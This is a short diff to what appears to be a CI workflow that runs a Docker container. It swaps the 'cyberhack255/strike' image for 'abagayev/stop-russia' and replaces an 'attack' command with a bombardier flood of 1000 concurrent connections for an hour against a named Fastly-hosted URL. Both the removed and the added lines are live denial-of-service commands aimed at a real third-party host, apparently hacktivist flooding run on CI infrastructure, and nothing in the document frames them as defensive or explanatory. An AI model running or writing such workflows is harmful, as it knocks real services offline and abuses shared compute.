@@ -19,8 +19,8 @@ jobs:
       - name: Run Docker command
         uses: addnab/docker-run-action@v3
         with:
-            image: cyberhack255/strike:latest
+            image: abagayev/stop-russia:latest
             run: | 
-                  attack https://testngwaf.global.ssl.fastly.net 300 1000 $PROXY 100
+                  bombardier -c 1000 -d 3600s -l https://testngwaf.global.ssl.fastly.net
   
 
